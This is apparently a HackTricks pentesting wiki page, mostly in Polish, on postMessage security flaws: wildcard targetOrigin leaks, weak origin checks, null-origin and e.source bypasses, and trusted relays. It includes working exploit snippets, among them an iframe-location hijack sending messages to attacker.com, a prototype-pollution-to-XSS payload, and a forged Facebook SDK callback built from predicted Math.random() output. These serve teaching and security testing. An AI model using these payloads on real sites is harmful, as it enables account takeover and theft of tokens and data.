# Luki w PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Wysyłanie **PostMessage**

**PostMessage** używa następującej funkcji do wysyłania wiadomości:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauważ, że **targetOrigin** może być '\*' lub URL-em takim jak _https://company.com._\
W **drugim scenariuszu**, **wiadomość może być wysłana tylko do tej domeny** (nawet jeśli origin obiektu Window jest inny).\
Jeśli użyty jest **wildcard**, **wiadomości mogą być wysyłane do dowolnej domeny**, i będą wysyłane do origin obiektu Window.

### Attacking iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) jeśli znajdziesz stronę, którą można **iframed** (brak ochrony `X-Frame-Header`) i która **wysyła wrażliwe** wiadomości przez **postMessage** używając **wildcard** (\*), możesz **zmodyfikować** **origin** **iframe** i **leak** wrażliwą wiadomość do domeny kontrolowanej przez Ciebie.\
Zauważ, że jeśli strona może być iframed, ale **targetOrigin** jest **ustawiony na URL, a nie na wildcard**, ten **trick nie zadziała**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Wykorzystanie addEventListener

**`addEventListener`** to funkcja używana przez JS do zadeklarowania funkcji, która oczekuje **`postMessages`**.\
Zostanie użyty kod podobny do poniższego:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Zauważ w tym przypadku, że **pierwszą rzeczą**, którą robi kod, jest **sprawdzenie originu**. To jest niezwykle **ważne**, zwłaszcza jeśli strona ma robić **cokolwiek wrażliwego** z otrzymanymi informacjami (np. zmianę hasła). **Jeśli nie sprawdza originu, atakujący mogą sprawić, że ofiary prześlą dowolne dane do tych endpointów** i zmienić hasła ofiar (w tym przykładzie).

### Enumeracja

Aby **znaleźć nasłuchiwacze zdarzeń** na bieżącej stronie możesz:

- **Przeszukaj** kod JS pod kątem `window.addEventListener` i `$(window).on` (_JQuery version_)
- **Wykonaj** w konsoli narzędzi deweloperskich: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Przejdź do** _Elements --> Event Listeners_ w narzędziach deweloperskich przeglądarki

![](<../../images/image (396).png>)

- Użyj **rozszerzenia przeglądarki** takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia **przechwycą wszystkie wiadomości** i pokażą je Tobie.

### Obejścia weryfikacji originu

- Atrybut **`event.isTrusted`** jest uważany za bezpieczny, ponieważ zwraca `True` tylko dla zdarzeń wygenerowanych przez rzeczywiste akcje użytkownika. Choć jest trudny do obejścia, jeśli został poprawnie zaimplementowany, jego znaczenie w kontrolach bezpieczeństwa jest istotne.
- Użycie **`indexOf()`** do walidacji originu w zdarzeniach PostMessage może być podatne na obejścia. Przykład ilustrujący tę podatność:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** z `String.prototype.search()` jest przeznaczona dla wyrażeń regularnych, nie dla łańcuchów znaków. Przekazanie czegoś innego niż regexp prowadzi do niejawnej konwersji do regexu, co może uczynić metodę potencjalnie niebezpieczną. W regexie kropka (.) działa jako wildcard, pozwalając na obejście walidacji przy specjalnie spreparowanych domenach. Na przykład:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcja **`match()`**, podobnie jak `search()`, operuje na regexach. Jeśli regex jest źle skonstruowany, może być podatny na obejścia.
- Funkcja **`escapeHtml`** ma na celu sanitację wejścia przez escapowanie znaków. Jednak nie tworzy nowego obiektu z escapowanymi wartościami, lecz nadpisuje właściwości istniejącego obiektu. To zachowanie da się wykorzystać. Szczególnie, jeśli obiekt może być zmanipulowany tak, że jego kontrolowana właściwość nie uznaje `hasOwnProperty`, `escapeHtml` nie zadziała zgodnie z oczekiwaniami. Pokazano to w przykładach poniżej:

- Oczekiwane niepowodzenie:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Obejście escapowania:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

W kontekście tej luki obiekt `File` jest szczególnie podatny ze względu na swoją tylko-do-odczytu właściwość `name`. Ta właściwość, kiedy używana w szablonach, nie jest sanitizowana przez funkcję `escapeHtml`, co prowadzi do potencjalnych ryzyk bezpieczeństwa.

Właściwość `document.domain` w JavaScript może być ustawiona przez skrypt w celu skrócenia domeny, co pozwala na łagodniejsze egzekwowanie polityki same-origin w ramach tej samej domeny nadrzędnej.

### Zaufanie tylko do originu + zaufane przekaźniki

Jeśli odbiorca sprawdza tylko **`event.origin`** (np. ufa dowolnemu `*.trusted.com`), często można znaleźć **stronę "relay" na tym originie, która odsyła parametry kontrolowane przez atakującego za pomocą `postMessage`** do podanego `targetOrigin`/`targetWindow`. Przykłady to gadżety marketingowe/analityczne, które pobierają parametry query i przesyłają `{msg_type, access_token, ...}` do `opener`/`parent`. Możesz:

- **Otworzyć stronę ofiary w popupie/iframe, który ma `opener`** tak, aby zarejestrowały się jego handlery (wiele pixel/SDKów dołącza nasłuchiwacze tylko gdy istnieje `window.opener`).
- **Nawigować innym oknem atakującego do endpointu relay na zaufanym originie**, wypełniając pola wiadomości, które chcesz wstrzyknąć (typ wiadomości, tokeny, nonce'y).
- Ponieważ wiadomość teraz pochodzi **z zaufanego originu**, walidacja ograniczona do originu przechodzi i możesz wywołać uprzywilejowane zachowania (zmiany stanu, wywołania API, zapisy do DOM) w nasłuchiwaczu ofiary.

Zauważone wzorce nadużyć:

- Analytics SDKs (np. pixel/fbevents-style) przetwarzają wiadomości takie jak `FACEBOOK_IWL_BOOTSTRAP`, a następnie **wywołują backendowe API używając tokena dostarczonego w wiadomości** i dołączają **`location.href` / `document.referrer`** w ciele żądania. Jeśli dostarczysz własny token, możesz **odczytać te żądania w historii/logach żądań tokena** i wyeksfiltrować **kody/tokeny OAuth** obecne w URL/referrerze strony ofiary.
- Każdy relay, który odzwierciedla dowolne pola do `postMessage`, pozwala Ci **podszyć się pod typy wiadomości** oczekiwane przez uprzywilejowane nasłuchiwacze. Połącz to ze słabą walidacją wejścia, aby dotrzeć do wywołań Graph/REST, odblokowywania funkcji lub przepływów równoważnych CSRF.

Porady do poszukiwań: wyenumeruj nasłuchiwacze `postMessage`, które sprawdzają tylko `event.origin`, a następnie poszukaj **same-origin HTML/JS endpointów, które przekazują parametry URL za pomocą `postMessage`** (marketing previews, popupy logowania, strony błędów OAuth). Połącz oba z użyciem `window.open()` + `postMessage`, aby obejść sprawdzanie originu.

### Obejście e.origin == window.origin

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Omijanie e.source

Możliwe jest sprawdzenie, czy wiadomość pochodzi z tego samego okna, w którym skrypt nasłuchuje (szczególnie interesujące dla **Content Scripts from browser extensions** w celu sprawdzenia, czy wiadomość została wysłana z tej samej strony):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Możesz sprawić, że **`e.source`** wiadomości będzie null, tworząc **iframe**, który **wysyła** **postMessage** i jest **natychmiast usuwany**.

Więcej informacji **przeczytaj:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Aby przeprowadzić te ataki, najlepiej będziesz mógł **umieścić stronę ofiary** wewnątrz `iframe`. Ale niektóre nagłówki, takie jak `X-Frame-Header`, mogą **uniemożliwić** to **zachowanie**.\
W takich scenariuszach możesz nadal użyć mniej ukrytego ataku. Możesz otworzyć nową kartę do podatnej aplikacji webowej i komunikować się z nią:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kradzież wiadomości wysyłanej do child iframe przez zablokowanie głównej strony

Na poniższej stronie możesz zobaczyć, jak można ukraść **sensitive postmessage data** wysyłane do **child iframe** poprzez **blocking** **main** strony przed wysłaniem danych i wykorzystanie **XSS in the child** aby **leak the data** zanim zostaną odebrane:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Kradzież wiadomości przez zmianę lokalizacji iframe

Jeśli możesz osadzić stronę w iframe bez X-Frame-Header, która zawiera inny iframe, możesz **change the location of that child iframe**, więc jeśli odbiera ona **postmessage** wysłany z użyciem **wildcard**, atakujący mógłby **change** origin tego iframe'a na stronę **controlled** przez niego i **steal** wiadomość:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage do Prototype Pollution i/lub XSS

W scenariuszach, w których dane przesyłane przez `postMessage` są wykonywane przez JS, możesz osadzić stronę w **iframe** i wykorzystać **prototype pollution/XSS**, wysyłając exploit przez `postMessage`.

Kilka **bardzo dobrze wyjaśnionych XSS przez `postMessage`** można znaleźć pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Przykład exploita do wykorzystania **Prototype Pollution a następnie XSS** przez `postMessage` do `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Dla **więcej informacji**:

- Link do strony o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link do strony o [**XSS**](../xss-cross-site-scripting/index.html)
- Link do strony o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Przewidywanie **`Math.random()`** tokenów callback w mostkach postMessage

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. Jeśli kontrolujesz top frame, umieść stronę ofiary w iframe, następnie przeprowadź nawigację plugin iframe do swojego origin (np. `window.frames[0].frames[0].location='https://attacker.com'`) i odczytaj `window.frames[0].frames[0].name`, aby uzyskać surowe wyjście `Math.random()`.

- **Wymuś więcej wyjść bez przeładowań:** Some SDKs expose a reinit path; w FB SDK wywołanie `init:post` z `{xfbml:1}` wymusza `XFBML.parse()`, niszczy/odtwarza plugin iframe i generuje nowe nazwy/ID callbacków. Powtarzane reinity dostarczają tyle wyjść PRNG, ile potrzeba (uwaga na dodatkowe wewnętrzne wywołania `Math.random()` dla ID callback/iframe, więc algorytmy predykcyjne muszą pominąć wartości pośrednie).

- **Trusted-origin delivery via parameter pollution:** Jeśli endpoint wtyczki pierwszej strony odzwierciedla niesanitizowany parametr w cross-window payload (np. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), możesz wstrzyknąć `&type=...&iconSVG=...` zachowując zaufany origin `facebook.com`.

- **Predict the next callback:** Convert leaked iframe names back to floats in [0,1) i podaj kilka wartości (nawet niekolejnych) do predyktora `Math.random` V8 (np. opartego na Z3). Wygeneruj lokalnie następne `guid()` aby sfałszować oczekiwany token callback.

- **Trigger the sink:** Sporządź dane postMessage tak, aby bridge wyemitował `xd.mpn.setupIconIframe` i wstrzyknął HTML w `iconSVG` (np. URL-encoded `<img src=x onerror=...>`), osiągając DOM XSS wewnątrz hostującego originu; stamtąd można odczytać same-origin iframe'y (dialogi OAuth, arbiters itp.).

- **Framing quirks help:** Łańcuch wymaga framingu. W niektórych mobile webviews `X-Frame-Options` może degradować do nieobsługiwanego `ALLOW-FROM` gdy obecny jest `frame-ancestors`, a parametry „compat” mogą wymusić permisywne `frame-ancestors`, umożliwiając kanał boczny `window.name`.

#### Minimalny przykład sfałszowanej wiadomości
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## References

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Do ćwiczeń: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
